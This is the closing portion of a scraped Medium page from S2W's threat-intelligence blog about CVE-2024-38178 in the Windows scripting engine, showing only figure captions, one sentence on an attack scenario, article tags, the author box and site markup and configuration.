50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="615" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 17. Javascript embedded in an ad page</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="c45a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">A supply chain attack scenario using phishing domain hosting could trigger the vulnerability of the <em class="nx">Toast.gom</em> process renders a malicious web page.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg sa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dmM2PUKU_P8gJqIEcfh2yw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*dmM2PUKU_P8gJqIEcfh2yw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*dmM2PUKU_P8gJqIEcfh2yw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*dmM2PUKU_P8gJqIEcfh2yw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*dmM2PUKU_P8gJqIEcfh2yw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*dmM2PUKU_P8gJqIEcfh2yw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*dmM2PUKU_P8gJqIEcfh2yw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*dmM2PUKU_P8gJqIEcfh2yw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="443" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 18. Vulnerability triggered by passing a URL with malicious javascript as an argument</figcaption></figure></div></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="sb sc ab ja"><div class="sd ab"><a class="se ay am ao" rel="noopener follow" href="/tag/threat-intelligence?source=post_page-----91ad954dbf83--------------------------------"><div class="sf fj cx sg ge sh si bf b bg z bk sj">Threat Intelligence</div></a></div><div class="sd ab"><a class="se ay am ao" rel="noopener follow" href="/tag/apt37?source=post_page-----91ad954dbf83--------------------------------"><div class="sf fj cx sg ge sh si bf b bg z bk sj">Apt37</div></a></div><div class="sd ab"><a class="se ay am ao" rel="noopener follow" href="/tag/scarcruft?source=post_page-----91ad954dbf83--------------------------------"><div class="sf fj cx sg ge sh si bf b bg z bk sj">Scarcruft</div></a></div><div class="sd ab"><a class="se ay am ao" rel="noopener follow" href="/tag/cve-2024-38178?source=post_page-----91ad954dbf83--------------------------------"><div class="sf fj cx sg ge sh si bf b bg z bk sj">Cve 2024 38178</div></a></div><div class="sd ab"><a class="se ay am ao" rel="noopener follow" href="/tag/vulnerability?source=post_page-----91ad954dbf83--------------------------------"><div class="sf fj cx sg ge sh si bf b bg z bk sj">Vulnerability</div></a></div></div></div></div><div class="l"></div><footer class="sk sl sm sn so sp sq sr ss ab q st ik c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp su"><div class="ab q kv"><div class="sv l"><span class="l sw sx sy e d"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fs2wblog%2F91ad954dbf83&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=-----91ad954dbf83---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span><span class="l h g f sz ta"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fs2wblog%2F91ad954dbf83&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=-----91ad954dbf83---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="tb l ix"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F91ad954dbf83&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;source=--------------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="tb l ix"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="tc td te tf tg l bx"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="cl ab th cp"><div class="ab ia"><a rel="noopener follow" href="/@s2w?source=post_page-----91ad954dbf83--------------------------------"><div class="l ti tj by tk ie"><div class="l fj"><img alt="S2W" class="l fd by tl tm cx" src="https://miro.medium.com/v2/resize:fill:144:144/1*1DiWQYMzvUSAzrLJQX1z6g.png" width="72" height="72" loading="lazy"/><div class="if by l tl tm fs n ig ft"></div></div></div></a><a href="https://medium.com/s2wblog?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><div class="tn ab fj"><div><div class="bm" aria-hidden="false"><div class="l to tp by tk ik"><div class="l fj"><img alt="S2W BLOG" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*3vCxewFUeWWkQ-O5X558rQ.jpeg" width="32" height="32" loading="lazy"/><div class="if by l bz ca fs n ig ft"></div></div></div></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bf b bg z tq sf tr ts tt tu tv ev ew tw tx ty fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F132c6e8141c4&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;newsletterV3=b408bb1e7c46&amp;newsletterV3Id=132c6e8141c4&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=-----91ad954dbf83---------------------subscribe_user-----------"><button class="bf b bg z ua am ub uc ud ue uf ug uh ui ew tw tx ty fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="tz tp to"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab cn cp"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/@s2w?source=post_page-----91ad954dbf83--------------------------------"><h2 class="pw-author-name bf uj uk ul um bk"><span class="gn jo">Written by <!-- -->S2W</span></h2></a></div><div class="sd ab"><div class="l ix"><span class="pw-follower-count bf b bg z bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/@s2w/followers?source=post_page-----91ad954dbf83--------------------------------">645 Followers</a></span></div><div class="bf b bg z jf jg jh ab jj jk jl jm du jd"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><span class="l ix">Editor for </span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" href="https://medium.com/s2wblog?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b bg z jf jg jh ji jj jk jl jm bk">S2W BLOG</p></a></div></div></div></div><div class="un l"><p class="bf b bg z bk"><span class="gn">S2W is specializing in cybersecurity data analysis for cyber threat intelligence.</span></p></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z tq sf tr ts tt tu tv ev ew tw tx ty fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F132c6e8141c4&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;newsletterV3=b408bb1e7c46&amp;newsletterV3Id=132c6e8141c4&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=-----91ad954dbf83---------------------subscribe_user-----------"><button class="bf b bg z ua am ub uc ud ue uf ug uh ui ew tw tx ty fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="tz tp to"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="uo bh up uq ur us ut uu"></div></div></div><div class="h k j"><div class="uo bh up uv"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="uw ab kv ja"><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/about?autoplay=1&amp;source=post_page-----91ad954dbf83--------------------------------"><p class="bf b dv z du">About</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----91ad954dbf83--------------------------------"><p class="bf b dv z du">Careers</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="ux uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="ux l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/business?source=post_page-----91ad954dbf83--------------------------------"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241017-182126-a0128a89d2"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-91ad954dbf83","user-b408bb1e7c46","collection-30a8766b5c42"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false,"publicationHierarchyEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":true,"routingEntity":{"type":"DEFAULT","explicit":false},"viewerIsBot":false},"debug":{"requestId":"730f40a7-a56f-4605-b9f2-a4646654a43e","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-62dfc3e4eb6634b086f7db8937650573-fb425d344990a214-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20241017-182126-a0128a89d2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241017-182126-a0128a89d2","commit":"a0128a89d2d76bfa55b25492370b0bae4050224f"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F36004